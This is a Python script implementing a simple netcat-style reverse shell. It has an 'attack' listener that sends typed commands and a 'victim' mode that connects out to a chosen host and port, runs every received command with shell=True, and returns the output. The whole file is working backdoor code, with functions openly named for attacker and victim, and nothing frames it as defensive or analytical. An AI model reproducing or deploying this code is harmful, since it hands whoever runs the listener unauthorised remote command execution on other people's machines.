import sys
import getopt
import socket
from threading import Thread
import subprocess
import os

HOST = ""
PORT = 0
LISTEN = False
SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Thread
def attack_send_req(Con):
    while True:
        try:
            command = input('<netcat># ')
            if(command == 'exit'):
                Con.send(command.encode())
                sys.exit(0)
            Con.send(command.encode())
        except:
            break

def attack_recv_res(Con):
    while True:
        try:
            buffer = Con.recv(4096).decode()
        except:
            break
        if buffer =='':
            break
        print(buffer)

def attack():
    # print('Atk')
    global PORT,SOCK
    SOCK.bind(('',PORT))
    SOCK.listen()
    Victim, _ = SOCK.accept()
    asr = Thread(target=attack_send_req, args=(Victim,))
    arr = Thread(target=attack_recv_res, args=(Victim,))
    asr.start()
    arr.start()
    asr.join()
    arr.join()

def victim():
    # print('Vic')
    global HOST, PORT, SOCK
    SOCK.connect( (HOST,PORT) )
    victim_exec_req(SOCK)

def victim_exec_req(Con):
    while True:
        try:
            command = Con.recv(4096).decode() 
            if command[:2] == 'cd':
                os.chdir(command[3:])
            elif command == 'exit':
                sys.exit(0)
            else:
                #Popen = process open
                process = subprocess.Popen(command, stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                shell=True)
                stdout, stderr = process.communicate()
                #b itu buat soalnya bentuknya byte
                if stdout == b'':
                    Con.send(stderr)
                else:
                    Con.send(stdout)
        except:
            break
        

def main():
    global HOST, PORT, LISTEN
    try:
        args, _ = getopt.getopt(sys.argv[1:],"h:p:")
    except getopt.GetoptError:
        args, _ = getopt.getopt(sys.argv[1:],"p:l")
    for key, value in args:
        if key == '-h':
            HOST = value
        if key == '-p':
            PORT = int(value)
        if key == '-l':
            LISTEN = True
    if LISTEN == True:
        attack()
    else:
        victim()


if __name__ == '__main__':
    main()